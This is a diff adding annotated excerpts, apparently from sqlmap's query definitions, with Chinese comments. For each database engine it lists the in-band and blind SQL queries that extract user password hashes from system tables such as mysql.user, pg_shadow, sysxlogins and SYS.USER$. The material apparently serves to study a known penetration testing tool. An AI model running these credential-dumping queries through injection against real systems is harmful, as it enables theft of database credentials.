@@ -1,0 +1,56 @@
+<!-- 返回数据库中(指定)用户密码 -->
+
+<!-- MySQL -->
+<!-- 对应sqlmap选项--passwords获取(指定)用户密码哈希 -->
+<passwords>
+    <inband query="SELECT user,password FROM mysql.user" condition="user"/>
+    <blind query="SELECT DISTINCT(password) FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user='%s'"/>
+</passwords>
+
+<!-- PostgreSQL -->
+<passwords>
+    <inband query="SELECT usename,passwd FROM pg_shadow" condition="usename"/>
+    <blind query="SELECT DISTINCT(passwd) FROM pg_shadow WHERE usename='%s' OFFSET %d LIMIT 1" count="SELECT COUNT(DISTINCT(passwd)) FROM pg_shadow WHERE usename='%s'"/>
+</passwords>
+<!-- Microsoft SQL Server -->
+<passwords>
+    <inband query="SELECT name,master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins" query2="SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins" condition="name"/>
+    <blind query="SELECT TOP 1 master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins WHERE name='%s' AND password NOT IN (SELECT TOP %d password FROM master..sysxlogins WHERE name='%s' ORDER BY password) ORDER BY password" query2="SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='%s' AND password_hash NOT IN (SELECT TOP %d password_hash FROM sys.sql_logins WHERE name='%s' ORDER BY password_hash) ORDER BY password_hash" count="SELECT LTRIM(STR(COUNT(password))) FROM master..sysxlogins WHERE name='%s'" count2="SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='%s'"/>
+</passwords>
+
+<!-- Microsoft Access -->
+无
+
+<!-- Oracle -->
+<passwords>
+    <inband query="SELECT NAME,PASSWORD FROM SYS.USER$" condition="NAME"/>
+    <blind query="SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS LIMIT FROM SYS.USER$ WHERE NAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(PASSWORD) FROM SYS.USER$ WHERE NAME='%s'"/>
+</passwords>
+<!-- SQLite -->
+无
+
+<!-- Informix -->
+<passwords>
+    <inband query="SELECT USERNAME,HASHED_PASSWORD||':'||SALT FROM SYSUSER:SYSINTAUTHUSERS" condition="USERNAME"/>
+    <blind query="SELECT HASHED_PASSWORD||':'||SALT FROM SYSUSER:SYSINTAUTHUSERS WHERE USERNAME='%s'"/>
+</passwords>
+<!-- IBM DB2 -->
+无
+
+<!-- Hyper SQL Database -->
+<passwords>
+    <!-- Passwords only shown in later versions &gt;=2.0  -->
+    <blind query="SELECT LIMIT %d 1 DISTINCT(password_digest) FROM INFORMATION_SCHEMA.SYSTEM_USERS WHERE user_name='%s' ORDER BY password_digest" count="SELECT COUNT(DISTINCT(password_digest)) FROM INFORMATION_SCHEMA.SYSTEM_USERS WHERE user_name='%s'"/>
+    <inband query="SELECT user_name,password_digest FROM INFORMATION_SCHEMA.SYSTEM_USERS ORDER BY user_name" condition="user_name"/>
+</passwords>
+<!-- Sybase -->
+<passwords>
+    <inband query="SELECT name,password FROM master..syslogins" condition="name"/>
+    <blind/>
+</passwords>
+
+<!-- Firebird -->
+无
+
+<!-- SAP MaxDB -->
+无
